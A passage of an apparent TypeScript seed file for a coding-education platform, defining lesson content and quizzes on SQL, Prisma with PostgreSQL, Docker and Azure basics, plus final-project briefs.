      `Time to combine everything into a set of real queries against a small schema of your own design, with tables like \`students(id, name, xp)\`, \`courses(id, title)\`, and \`enrollments(student_id, course_id)\`.\n\n## Requirements\n\n1. Write a \`SELECT\` with a \`WHERE\` clause that lists all students above a given XP threshold.\n2. Write a query that \`JOIN\`s students and enrollments (and courses) to show which courses each student is taking.\n3. Write a query using \`GROUP BY\` and \`COUNT\` to show how many students are enrolled in each course.\n4. Write an \`UPDATE\` statement that safely modifies a specific row, with a \`WHERE\` clause.\n5. Write an \`INSERT\` statement that adds a new student.\n\n## Stretch goals\n\n- Use a \`LEFT JOIN\` to find students with zero enrollments.\n- Use \`HAVING\` to find courses with more than a set number of students.\n- Add a \`DELETE\` statement (with a safe \`WHERE\` clause!) for removing a dropped enrollment.\n\nSubmit a link to your schema and queries (e.g. a repo or gist) below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const nodePrismaLessons: SeedLesson[] = [
  {
    title: 'Why Prisma? Connecting Node.js to PostgreSQL',
    content: lessonContent(
      'Why Prisma? Connecting Node.js to PostgreSQL',
      `You've written raw SQL by hand. Now let's connect a real Node.js application to a real PostgreSQL database, and see how **Prisma** makes that connection type-safe and far less error-prone.\n\n## The stack\n\n\`\`\`\nNode.js application\n        │\n        ▼\n  Prisma Client   (generated, type-safe query API)\n        │\n        ▼\n  PostgreSQL database\n\`\`\`\n\nPrisma is an **ORM** (Object-Relational Mapper) for Node.js and TypeScript. You describe your data once, in a schema file, and Prisma generates:\n\n- **Prisma Client**, a fully-typed query API your app calls instead of writing SQL strings by hand.\n- **Migrations**, versioned SQL files that evolve your database schema safely over time.\n\n## Why not just write SQL directly?\n\nYou still can, Prisma Client executes real SQL under the hood. What it adds is:\n\n- **Type safety**, your editor autocompletes column names and catches typos before you ever run the code.\n- **Migrations tracked in version control**, so your team and your database never drift out of sync.\n- Protection against SQL injection by default, since every query is parameterized.\n\n> [!NOTE]\n> Everything you learned in the SQL Fundamentals course still applies, Prisma generates SQL very close to what you'd write by hand, it just does it for you, safely.`
    ),
    quiz: {
      title: 'Prisma Intro Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is Prisma?',
          options: [
            'A PostgreSQL hosting provider',
            'An ORM that generates a type-safe query API and manages migrations',
            'A frontend framework',
            'A replacement for JavaScript',
          ],
          answer: 'An ORM that generates a type-safe query API and manages migrations',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Prisma Client is generated from a ____ file that describes your data models.',
          options: [],
          answer: 'schema',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Prisma Client still executes real SQL against the database under the hood.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Setting Up PostgreSQL and a Prisma Project',
    content: lessonContent(
      'Setting Up PostgreSQL and a Prisma Project',
      `## 1. Get a PostgreSQL database running\n\nLocally (via Docker) or a hosted free tier both work, either way you end up with a **connection string**:\n\n\`\`\`\npostgresql://USER:PASSWORD@HOST:PORT/DATABASE\n\`\`\`\n\n## 2. Create a Node project and install Prisma\n\n\`\`\`bash\nnpm init -y\nnpm install prisma --save-dev\nnpm install @prisma/client\nnpx prisma init\n\`\`\`\n\n\`npx prisma init\` creates:\n\n- \`prisma/schema.prisma\`, where you'll define your data models.\n- \`.env\`, with a \`DATABASE_URL\` placeholder for your connection string.\n\n## 3. Point it at your database\n\n\`\`\`\nDATABASE_URL="postgresql://postgres:secret@localhost:5432/blog_dev?schema=public"\n\`\`\`\n\nPrisma reads \`DATABASE_URL\` from your environment, never hardcode credentials directly in \`schema.prisma\`.`
    ),
    quiz: {
      title: 'Setup Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command scaffolds a new prisma/schema.prisma file and a .env template?',
          options: ['npx prisma generate', 'npx prisma init', 'npx prisma migrate dev', 'npm install prisma'],
          answer: 'npx prisma init',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Prisma reads the database connection string from the environment variable ____.',
          options: [],
          answer: 'DATABASE_URL',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Database credentials should be hardcoded directly inside schema.prisma.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Defining Your Prisma Schema',
    content: lessonContent(
      'Defining Your Prisma Schema',
      `\`prisma/schema.prisma\` has three parts: a generator, a datasource, and one or more models.\n\n\`\`\`\ngenerator client {\n  provider = "prisma-client-js"\n}\n\ndatasource db {\n  provider = "postgresql"\n  url      = env("DATABASE_URL")\n}\n\nmodel User {\n  id    Int     @id @default(autoincrement())\n  email String  @unique\n  name  String?\n}\n\`\`\`\n\n## Reading a model\n\n- Each field has a name, a type (\`Int\`, \`String\`, \`Boolean\`, \`DateTime\`, ...), and optional attributes.\n- \`@id\` marks the primary key.\n- \`@default(autoincrement())\` lets PostgreSQL assign the next integer automatically, exactly like \`SERIAL\` in raw SQL.\n- \`@unique\` adds a unique constraint, no two users can share an email.\n- A trailing \`?\` (like \`String?\`) makes a field optional, it maps to a nullable column.\n\nEvery model becomes a table, every field becomes a column, this is the same shape of data you already modeled in the SQL Fundamentals course, just described declaratively instead of with \`CREATE TABLE\`.`
    ),
    quiz: {
      title: 'Schema Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which attribute marks a field as the primary key?',
          options: ['@unique', '@primary', '@id', '@key'],
          answer: '@id',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A field type written with a trailing ____ mark, like String?, is optional in the database.',
          options: [],
          answer: '?',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Every model block in schema.prisma becomes a table in the database.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Migrations with Prisma Migrate',
    content: lessonContent(
      'Migrations with Prisma Migrate',
      `A **migration** is a versioned, applied change to your database schema. Prisma Migrate generates and runs the SQL for you, based on the differences it sees in \`schema.prisma\`.\n\n\`\`\`bash\nnpx prisma migrate dev --name init\n\`\`\`\n\nThis command:\n\n1. Compares your schema to the database's current state.\n2. Generates a plain SQL migration file (you can open and read it, it's just \`CREATE TABLE\`, \`ALTER TABLE\`, and so on).\n3. Applies it to your database.\n4. Regenerates Prisma Client so your code's types match the new schema.\n\nEach migration lives in \`prisma/migrations/<timestamp>_init/migration.sql\`, committed to version control alongside your code, exactly like the rest of your app's history.\n\n## Inspecting your data\n\n\`\`\`bash\nnpx prisma studio\n\`\`\`\n\nOpens a local, visual browser for your database, handy for checking that a migration or query did what you expected.`
    ),
    quiz: {
      title: 'Migrations Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does npx prisma migrate dev generate?',
          options: [
            'A plain SQL migration file that gets applied to the database',
            'A compiled binary',
            'A new PostgreSQL server',
            'A JSON config file only',
          ],
          answer: 'A plain SQL migration file that gets applied to the database',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'npx prisma ____ opens a local, visual browser for your database.',
          options: [],
          answer: 'studio',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Prisma migration files are meant to be committed to version control.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Prisma Client: Basic CRUD',
    content: lessonContent(
      'Prisma Client: Basic CRUD',
      `Once your schema is migrated, Prisma Client gives you a typed method for every model.\n\n\`\`\`\nimport { PrismaClient } from '@prisma/client';\nconst prisma = new PrismaClient();\n\n// Create\nconst user = await prisma.user.create({\n  data: { email: 'ada@example.com', name: 'Ada' },\n});\n\n// Read\nconst users = await prisma.user.findMany();\nconst one = await prisma.user.findUnique({ where: { id: 1 } });\n\n// Update\nconst updated = await prisma.user.update({\n  where: { id: 1 },\n  data: { name: 'Ada Lovelace' },\n});\n\n// Delete\nawait prisma.user.delete({ where: { id: 1 } });\n\`\`\`\n\n*This needs a running Node.js process connected to a real PostgreSQL database, so it's read-only here, you'll run code exactly like this in the final project.*\n\nNotice the shape: every method takes a single options object (\`where\`, \`data\`, ...), and every method returns a fully-typed result, your editor knows \`user.email\` is a \`string\` without you writing a type annotation anywhere.`
    ),
    quiz: {
      title: 'CRUD Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which Prisma Client method fetches every row that matches optional filters?',
          options: ['findOne', 'findMany', 'getAll', 'selectAll'],
          answer: 'findMany',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'prisma.user.____({ where: { id: 1 } }) fetches a single user by a unique field.',
          options: [],
          answer: 'findUnique',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Prisma Client's create and update methods return the affected row, fully typed.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Filtering, Sorting, and Pagination',
    content: lessonContent(
      'Filtering, Sorting, and Pagination',
      `Prisma Client mirrors the \`WHERE\`, \`ORDER BY\`, and \`LIMIT\`/\`OFFSET\` you already know from SQL, as options on \`findMany\`.\n\n\`\`\`\nconst topPosts = await prisma.post.findMany({\n  where: {\n    published: true,\n    title: { contains: 'Prisma' },\n  },\n  orderBy: { createdAt: 'desc' },\n  skip: 0,\n  take: 10,\n});\n\`\`\`\n\n## Mapping to SQL\n\n| Prisma option | SQL equivalent |\n|---|---|\n| \`where: { published: true }\` | \`WHERE published = true\` |\n| \`orderBy: { createdAt: 'desc' }\` | \`ORDER BY created_at DESC\` |\n| \`take: 10\` | \`LIMIT 10\` |\n| \`skip: 20\` | \`OFFSET 20\` |\n\n\`skip\` + \`take\` together give you **pagination**, page 3 of 10-per-page results is \`skip: 20, take: 10\`.`
    ),
    quiz: {
      title: 'Filtering & Pagination Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which Prisma option is equivalent to SQL\'s LIMIT?',
          options: ['skip', 'take', 'limit', 'first'],
          answer: 'take',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The ____ option in findMany is equivalent to SQL\'s OFFSET.',
          options: [],
          answer: 'skip',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Prisma's orderBy option maps directly to SQL's ORDER BY clause.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Modeling Relations: One-to-Many and Many-to-Many',
    content: lessonContent(
      'Modeling Relations: One-to-Many and Many-to-Many',
      `Just like the \`JOIN\`s you wrote in SQL, Prisma models real relationships between tables, but you declare them once in the schema.\n\n## One-to-many\n\nOne \`User\` can have many \`Post\`s:\n\n\`\`\`\nmodel User {\n  id    Int    @id @default(autoincrement())\n  email String @unique\n  posts Post[]\n}\n\nmodel Post {\n  id       Int    @id @default(autoincrement())\n  title    String\n  authorId Int\n  author   User   @relation(fields: [authorId], references: [id])\n}\n\`\`\`\n\n\`authorId\` is a real foreign-key column, \`author\`/\`posts\` are the Prisma-side relation fields you query through.\n\n## Many-to-many\n\nA \`Post\` can have many \`Tag\`s, and a \`Tag\` can apply to many \`Post\`s:\n\n\`\`\`\nmodel Post {\n  id    Int   @id @default(autoincrement())\n  title String\n  tags  Tag[]\n}\n\nmodel Tag {\n  id    Int    @id @default(autoincrement())\n  name  String @unique\n  posts Post[]\n}\n\`\`\`\n\nPrisma automatically creates and manages the hidden join table behind the scenes, the same \`_PostToTag\` style table you'd have written by hand in SQL.`
    ),
    quiz: {
      title: 'Relations Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In a one-to-many relation, which side holds the actual foreign-key column?',
          options: ['The "many" side (e.g. Post.authorId)', 'The "one" side (e.g. User)', 'Neither, Prisma stores it separately', 'Both sides equally'],
          answer: 'The "many" side (e.g. Post.authorId)',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A many-to-many relation like Post.tags and Tag.posts is backed by a hidden ____ table.',
          options: [],
          answer: 'join',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'For an implicit many-to-many relation, you must manually create the join table yourself.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Querying Relations with include and select',
    content: lessonContent(
      'Querying Relations with include and select',
      `By default, Prisma Client only returns a model's own columns, related data has to be requested explicitly.\n\n\`\`\`\n// Fetch a user together with their posts\nconst userWithPosts = await prisma.user.findUnique({\n  where: { id: 1 },\n  include: { posts: true },\n});\n\n// Shape exactly which fields come back\nconst summaries = await prisma.post.findMany({\n  select: {\n    title: true,\n    author: { select: { name: true } },\n  },\n});\n\n// Create a user and their first post in one call\nconst newUser = await prisma.user.create({\n  data: {\n    email: 'grace@example.com',\n    name: 'Grace',\n    posts: { create: [{ title: 'Hello, Prisma!' }] },\n  },\n});\n\`\`\`\n\n\`include\` adds related records on top of all normal fields, \`select\` replaces the default fields entirely, letting you return only what you need. A **nested write** like the \`posts: { create: [...] }\` above creates both rows in a single call.`
    ),
    quiz: {
      title: 'Include & Select Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the include option do?',
          options: [
            'Replaces all fields with only the ones listed',
            'Adds related records on top of the normal fields',
            'Deletes unrelated records',
            'Renames columns',
          ],
          answer: 'Adds related records on top of the normal fields',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Creating a user and a related post in a single call, via posts: { create: [...] }, is called a nested ____.',
          options: [],
          answer: 'write',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'By default, Prisma Client automatically includes every related model on every query.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Transactions and Data Integrity',
    content: lessonContent(
      'Transactions and Data Integrity',
      `Some operations only make sense together. If you move XP from one account to another, both the debit and the credit must succeed, or neither should.\n\n## Batch transactions\n\n\`\`\`\nconst [fromAccount, toAccount] = await prisma.$transaction([\n  prisma.account.update({ where: { id: 1 }, data: { xp: { decrement: 50 } } }),\n  prisma.account.update({ where: { id: 2 }, data: { xp: { increment: 50 } } }),\n]);\n\`\`\`\n\nIf either update fails, PostgreSQL rolls back both, your data never ends up half-changed.\n\n## Interactive transactions\n\nFor logic that needs to check something in between steps, pass a function instead:\n\n\`\`\`\nawait prisma.$transaction(async (tx) => {\n  const from = await tx.account.findUniqueOrThrow({ where: { id: 1 } });\n  if (from.xp < 50) throw new Error('Insufficient XP');\n\n  await tx.account.update({ where: { id: 1 }, data: { xp: { decrement: 50 } } });\n  await tx.account.update({ where: { id: 2 }, data: { xp: { increment: 50 } } });\n});\n\`\`\`\n\nThrowing anywhere inside the callback rolls back every query that already ran in that transaction.`
    ),
    quiz: {
      title: 'Transactions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What happens if one query inside a prisma.$transaction([...]) call fails?',
          options: [
            'Only that query is skipped, the rest still commit',
            'All queries in the transaction are rolled back',
            'The database is deleted',
            'Nothing, errors inside transactions are ignored',
          ],
          answer: 'All queries in the transaction are rolled back',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Throwing an error inside an interactive $transaction callback function ____ every query that already ran in it.',
          options: [],
          answer: 'rolls back',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Transactions guarantee that a group of related writes either all succeed or all fail together.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Building a REST API with Express and Prisma',
    content: lessonContent(
      'Building a REST API with Express and Prisma',
      `Wiring Prisma into an Express route handler looks almost exactly like the CRUD calls from earlier, just inside a request handler.\n\n\`\`\`\nimport express from 'express';\nimport { PrismaClient } from '@prisma/client';\n\nconst app = express();\nconst prisma = new PrismaClient();\napp.use(express.json());\n\napp.get('/api/posts', async (req, res) => {\n  const posts = await prisma.post.findMany({\n    where: { published: true },\n    include: { author: { select: { name: true } } },\n    orderBy: { createdAt: 'desc' },\n  });\n  res.json(posts);\n});\n\napp.post('/api/posts', async (req, res) => {\n  try {\n    const post = await prisma.post.create({ data: req.body });\n    res.status(201).json(post);\n  } catch (err) {\n    res.status(400).json({ error: 'Could not create post' });\n  }\n});\n\napp.listen(4000);\n\`\`\`\n\nOne \`PrismaClient\` instance is created once and reused across every request, creating a new one per request would open far too many database connections.`
    ),
    quiz: {
      title: 'Express + Prisma Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How many PrismaClient instances should a typical Express app create?',
          options: ['One per request', 'One, reused across every request', 'One per database table', 'It does not matter'],
          answer: 'One, reused across every request',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Wrapping a Prisma call in try/catch inside a route handler lets you return a proper error ____ code instead of crashing.',
          options: [],
          answer: 'status',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Prisma Client calls inside an Express route handler must be awaited, just like anywhere else.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Seeding and Testing Your Database',
    content: lessonContent(
      'Seeding and Testing Your Database',
      `A **seed script** fills a fresh database with starter data, so you (and your teammates) aren't testing against an empty database every time.\n\n\`\`\`\n// prisma/seed.ts\nimport { PrismaClient } from '@prisma/client';\nconst prisma = new PrismaClient();\n\nasync function main() {\n  await prisma.user.create({\n    data: {\n      email: 'ada@example.com',\n      name: 'Ada',\n      posts: { create: [{ title: 'My first post' }] },\n    },\n  });\n}\n\nmain().finally(() => prisma.$disconnect());\n\`\`\`\n\nWire it up in \`package.json\`:\n\n\`\`\`\n{\n  "prisma": {\n    "seed": "tsx prisma/seed.ts"\n  }\n}\n\`\`\`\n\nThen run it with:\n\n\`\`\`bash\nnpx prisma db seed\n\`\`\`\n\n## Resetting during development\n\n\`\`\`bash\nnpx prisma migrate reset\n\`\`\`\n\nDrops your dev database, reapplies every migration from scratch, and reruns your seed script, an easy way to get back to a known, clean state while building.\n\n> [!TIP]\n> This whole platform's own course catalog, including this lesson, is generated by exactly this kind of seed script.`
    ),
    quiz: {
      title: 'Seeding Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the purpose of a seed script?',
          options: [
            'To back up production data',
            'To fill a fresh database with starter data for development',
            'To compile TypeScript',
            'To generate the Prisma schema',
          ],
          answer: 'To fill a fresh database with starter data for development',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'npx prisma migrate ____ drops the dev database, reapplies migrations, and reruns the seed script.',
          options: [],
          answer: 'reset',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A seed script is typically run against a production database with real user data.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Blog API with Prisma & PostgreSQL',
    content: lessonContent(
      'Final Project: Build a Blog API with Prisma & PostgreSQL',
      `Time to combine everything, schema design, migrations, relations, transactions, and Express, into one real project.\n\n## Requirements\n\n1. Design a \`schema.prisma\` with at least two related models (e.g. \`User\` and \`Post\`, one-to-many).\n2. Generate and run a migration with \`npx prisma migrate dev\` against a real PostgreSQL database.\n3. Build a REST API in Express with full CRUD endpoints for at least one model, backed by Prisma Client.\n4. Implement one list endpoint that supports filtering, sorting, and pagination (\`where\`, \`orderBy\`, \`skip\`/\`take\`).\n5. Use \`prisma.$transaction\` somewhere the logic genuinely requires it (e.g. an operation that touches two related records atomically).\n6. Write a \`prisma/seed.ts\` script that populates a few starter rows.\n\n## Stretch goals\n\n- Add a many-to-many relation (e.g. tags on posts) and an endpoint that filters by tag.\n- Return pagination metadata (total count, page number) alongside the results.\n- Write at least one automated test for an endpoint.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const dockerLessons: SeedLesson[] = [
  {
    title: 'Why Docker? Containers vs. Virtual Machines',
    content: lessonContent(
      'Why Docker? Containers vs. Virtual Machines',
      `"It works on my machine" is one of the oldest problems in software. **Docker** solves it by packaging an application together with everything it needs to run, code, runtime, libraries, system tools, into a single **container** that behaves the same everywhere.\n\n## Containers vs. virtual machines\n\n| | Virtual Machine | Container |\n|---|---|---|\n| Includes | A full guest operating system | Just the app and its dependencies |\n| Startup time | Minutes | Seconds |\n| Size | Gigabytes | Often megabytes |\n| Isolation | Full hardware-level virtualization | Shares the host OS kernel, isolated processes |\n\nContainers are lighter because they don't boot a whole separate operating system, they share the host machine's kernel but keep everything else (filesystem, processes, network) isolated.\n\n## Images vs. containers\n\n- An **image** is a read-only template, the blueprint (think: a class).\n- A **container** is a running instance of an image (think: an object). You can start many containers from the same image.\n\n> [!NOTE]\n> Docker Desktop (or Docker Engine on Linux) is the tool that builds images and runs containers. Install it before the next lesson.`
    ),
    quiz: {
      title: 'Containers Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What do containers share with the host machine that virtual machines do not?',
          options: ['The filesystem', 'The kernel', 'The network', 'Nothing, they are identical to VMs'],
          answer: 'The kernel',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A Docker ____ is the read-only template that containers are started from.',
          options: [],
          answer: 'image',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'You can run multiple containers from the same image at the same time.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Your First Docker Container',
    content: lessonContent(
      'Your First Docker Container',
      `\`\`\`bash\ndocker --version\ndocker run hello-world\n\`\`\`\n\n\`docker run\` downloads the \`hello-world\` image from **Docker Hub** (a public registry of images) if you don't already have it, then starts a container from it.\n\n## Essential commands\n\n\`\`\`bash\ndocker pull nginx              # download an image without running it\ndocker images                  # list images you have locally\ndocker run -d -p 8080:80 nginx # run nginx in the background, map port 8080 -> 80\ndocker ps                      # list running containers\ndocker ps -a                   # list all containers, including stopped ones\ndocker stop <container_id>     # stop a running container\ndocker rm <container_id>       # remove a stopped container\n\`\`\`\n\n\`-p 8080:80\` maps port 8080 on your machine to port 80 inside the container, that's how you reach a containerized web server from your browser.\n\n> [!TIP]\n> \`docker ps\` only shows running containers, add \`-a\` to see stopped ones too, a common source of confusion for beginners.`
    ),
    quiz: {
      title: 'First Container Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command lists currently running containers?',
          options: ['docker images', 'docker ps', 'docker pull', 'docker list'],
          answer: 'docker ps',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The flag -p 8080:____ maps port 8080 on your machine to port 80 inside the container.',
          options: [],
          answer: '80',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'docker ps shows stopped containers by default, without needing any extra flags.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Writing a Dockerfile',
    content: lessonContent(
      'Writing a Dockerfile',
      `A **Dockerfile** is a script that describes how to build your own image, step by step.\n\n\`\`\`\nFROM node:20-alpine\n\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm install\n\nCOPY . .\n\nEXPOSE 3000\nCMD ["node", "server.js"]\n\`\`\`\n\n## Reading it line by line\n\n- \`FROM\` picks a base image to start from, here a lightweight Node.js image.\n- \`WORKDIR\` sets the working directory inside the container for every instruction after it.\n- \`COPY\` copies files from your machine into the image.\n- \`RUN\` executes a command **while building** the image (installing dependencies, here).\n- \`EXPOSE\` documents which port the container listens on.\n- \`CMD\` is the command that runs **when a container starts** from this image.\n\n## Building and running your image\n\n\`\`\`bash\ndocker build -t my-app .\ndocker run -p 3000:3000 my-app\n\`\`\`\n\n\`-t my-app\` tags the image with a name so you can refer to it later instead of a random id.\n\n> [!WARNING]\n> Copying \`package*.json\` and running \`npm install\` **before** copying the rest of your code lets Docker reuse that cached layer when only your source changes, skipping a slow reinstall on every build.`
    ),
    quiz: {
      title: 'Dockerfile Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which Dockerfile instruction runs a command while the image is being built (like installing dependencies)?',
          options: ['CMD', 'RUN', 'EXPOSE', 'FROM'],
          answer: 'RUN',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The docker ____ -t my-app . command builds an image from a Dockerfile and tags it "my-app".',
          options: [],
          answer: 'build',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'CMD specifies the command that runs when a container starts, not while the image is built.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Volumes and Environment Variables',
    content: lessonContent(
      'Volumes and Environment Variables',
      `Containers are meant to be disposable, when one is removed, anything written to its filesystem is gone too. **Volumes** and **environment variables** are how you deal with data and configuration that need to survive or vary between environments.\n\n## Volumes: persisting data\n\n\`\`\`bash\ndocker run -d -p 27017:27017 -v mongo_data:/data/db mongo\n\`\`\`\n\n\`-v mongo_data:/data/db\` mounts a named volume called \`mongo_data\` at \`/data/db\` inside the container. MongoDB's actual data lives in that volume, on the host machine, so it survives even if the container is removed and recreated.\n\n## Environment variables: configuration\n\n\`\`\`bash\ndocker run -e DATABASE_URL="postgresql://user:pass@db:5432/app" -p 3000:3000 my-app\n\`\`\`\n\n\`-e\` passes an environment variable into the container, exactly like setting one in your shell, letting the same image behave differently across dev, staging, and production without being rebuilt.\n\n> [!TIP]\n> Never bake secrets (passwords, API keys) directly into an image with \`COPY\` or \`RUN\`, pass them in at runtime with \`-e\` or an env file instead.`
    ),
    quiz: {
      title: 'Volumes & Env Vars Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why use a volume instead of writing data directly into a container?',
          options: [
            'Volumes make containers start faster',
            'Data in a volume survives even if the container is removed',
            'Volumes are required for every container',
            'Volumes disable networking',
          ],
          answer: 'Data in a volume survives even if the container is removed',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The ____ flag passes an environment variable into a running container.',
          options: [],
          answer: '-e',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Secrets like passwords should be baked directly into a Docker image with COPY.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Docker Compose: Multi-Container Apps',
    content: lessonContent(
      'Docker Compose: Multi-Container Apps',
      `Real applications are rarely a single container, you usually need an app server, a database, maybe a cache. **Docker Compose** describes a whole multi-container setup in one file.\n\n\`\`\`\nservices:\n  web:\n    build: .\n    ports:\n      - "3000:3000"\n    environment:\n      DATABASE_URL: postgresql://user:pass@db:5432/app\n    depends_on:\n      - db\n\n  db:\n    image: postgres:16\n    environment:\n      POSTGRES_PASSWORD: pass\n    volumes:\n      - db_data:/var/lib/postgresql/data\n\nvolumes:\n  db_data:\n\`\`\`\n\n## Running it\n\n\`\`\`bash\ndocker compose up -d\ndocker compose down\n\`\`\`\n\n\`docker compose up\` builds (if needed) and starts every service defined in the file. Notice \`web\` reaches the database at the hostname \`db\`, Compose automatically creates a shared network where each service can find the others **by service name**.\n\n\`depends_on\` controls startup order, but doesn't wait for the database to be fully ready to accept connections, that's a common real-world gotcha worth knowing about early.`
    ),
    quiz: {
      title: 'Compose Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In Docker Compose, how does one service reach another (e.g. web reaching db)?',
          options: [
            'By IP address only',
            'By the service name, as a hostname',
            'They cannot communicate',
            'By port forwarding to localhost',
          ],
          answer: 'By the service name, as a hostname',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'docker compose ____ builds and starts every service defined in the compose file.',
          options: [],
          answer: 'up',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "depends_on guarantees a service won't start until the service it depends on is fully ready to accept connections.",
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Containerize a Web App',
    content: lessonContent(
      'Final Project: Containerize a Web App',
      `Time to package a real application with Docker.\n\n## Requirements\n\n1. Write a \`Dockerfile\` for an existing app of yours (or a simple new one), ordering instructions so dependency installation is cached separately from your source code.\n2. Build the image and run it as a container, confirm it works by accessing it from your browser or a REST client.\n3. Add a second service the app depends on (a database, cache, etc.) using a \`docker-compose.yml\` file.\n4. Use a named volume so that service's data survives \`docker compose down\` and \`docker compose up\` again.\n5. Pass at least one piece of configuration in via an environment variable rather than hardcoding it.\n\n## Stretch goals\n\n- Add a \`.dockerignore\` file to keep \`node_modules\`/\`.git\`/etc. out of your image.\n- Use a multi-stage build to keep the final image small.\n- Push your image to Docker Hub.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const azureLessons: SeedLesson[] = [
  {
    title: 'Introduction to Cloud Computing and Azure',
    content: lessonContent(
      'Introduction to Cloud Computing and Azure',
      `**Cloud computing** means renting computing power, storage, and services from a provider instead of buying and maintaining your own servers. **Microsoft Azure** is one of the largest cloud providers, alongside AWS and Google Cloud.\n\n## The service models\n\n| Model | You manage | Provider manages | Example |\n|---|---|---|---|\n| IaaS | OS, runtime, app | Physical hardware, networking | Azure Virtual Machines |\n| PaaS | Just your app and data | OS, runtime, scaling | Azure App Service |\n| SaaS | Just your data | Everything else | Microsoft 365 |\n\nMost of this course focuses on **PaaS**, services like App Service let you deploy code directly without managing servers at all.\n\n## Azure's building blocks\n\n- **Regions**, physical data center locations around the world (e.g. "West Europe").\n- **Resource groups**, logical containers that hold related resources (a web app, its database, its storage) so you can manage and delete them together.\n- **Azure Portal**, the web dashboard for creating and managing everything visually, at [portal.azure.com](https://portal.azure.com).\n\n> [!NOTE]\n> Every Azure resource you create belongs to exactly one resource group, get comfortable with them early, they're the organizing unit for almost everything else in this course.`
    ),
    quiz: {
      title: 'Cloud Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In the PaaS model, which of these does the cloud provider manage for you?',
